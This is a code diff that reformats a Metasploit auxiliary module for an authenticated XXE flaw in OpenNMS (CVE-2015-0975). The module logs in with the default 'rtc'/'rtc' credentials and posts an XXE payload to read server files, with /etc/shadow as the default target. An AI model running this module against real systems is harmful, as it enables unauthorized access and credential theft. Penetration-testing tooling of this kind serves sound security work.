@@ -9,32 +9,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'OpenNMS Authenticated XXE',
-      'Description'    => %q{
-      OpenNMS is vulnerable to XML External Entity Injection in the Real-Time Console interface.
-      Although this attack requires authentication, there are several factors that increase the
-      severity of this vulnerability.
+    super(
+      update_info(
+        info,
+        'Name' => 'OpenNMS Authenticated XXE',
+        'Description' => %q{
+          OpenNMS is vulnerable to XML External Entity Injection in the Real-Time Console interface.
+          Although this attack requires authentication, there are several factors that increase the
+          severity of this vulnerability.
 
-      1. OpenNMS runs with root privileges, taken from the OpenNMS FAQ: "The difficulty with the
-      core of OpenNMS is that these components need to run as root to be able to bind to low-numbered
-      ports or generate network traffic that requires root"
+          1. OpenNMS runs with root privileges, taken from the OpenNMS FAQ: "The difficulty with the
+          core of OpenNMS is that these components need to run as root to be able to bind to low-numbered
+          ports or generate network traffic that requires root"
 
-      2. The user that you must authenticate as is the "rtc" user which has the default password of
-      "rtc". There is no mention of this user in the installation guides found here:
-      http://www.opennms.org/wiki/Tutorial_Installation, only mention that you should change the default
-      admin password of "admin" for security purposes.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => [
+          2. The user that you must authenticate as is the "rtc" user which has the default password of
+          "rtc". There is no mention of this user in the installation guides found here:
+          http://www.opennms.org/wiki/Tutorial_Installation, only mention that you should change the default
+          admin password of "admin" for security purposes.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Stephen Breen <breenmachine[at]gmail.com>', # discovery
           'Justin Kennedy <jstnkndy[at]gmail.com>', # metasploit module
         ],
-      'References'     => [
+        'References' => [
           ['CVE', '2015-0975']
         ],
-      'DisclosureDate' => '2015-01-08'
-    ))
+        'DisclosureDate' => '2015-01-08',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -44,12 +52,11 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILEPATH', [true, "The file or directory to read on the server", "/etc/shadow"]),
         OptString.new('USERNAME', [true, "The username to authenticate with", "rtc"]),
         OptString.new('PASSWORD', [true, "The password to authenticate with", "rtc"])
-      ])
-
+      ]
+    )
   end
 
   def run
-
     print_status("Logging in to grab a valid session cookie")
 
     res = send_request_cgi({
@@ -58,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
       'vars_post' => {
         'j_username' => datastore['USERNAME'],
         'j_password' => datastore['PASSWORD'],
-        'Login'=> 'Login'
+        'Login' => 'Login'
       },
     })
 
@@ -89,8 +96,8 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw({
       'method' => 'POST',
-      'uri'    => normalize_uri(target_uri.path, 'rtc', 'post/'),
-      'data'   => xxe,
+      'uri' => normalize_uri(target_uri.path, 'rtc', 'post/'),
+      'data' => xxe,
       'cookie' => cookie
     })
 
@@ -101,7 +108,5 @@ class MetasploitModule < Msf::Auxiliary
     else
       fail_with(Failure::Unknown, 'Error fetching file, try another')
     end
-
   end
 end
-
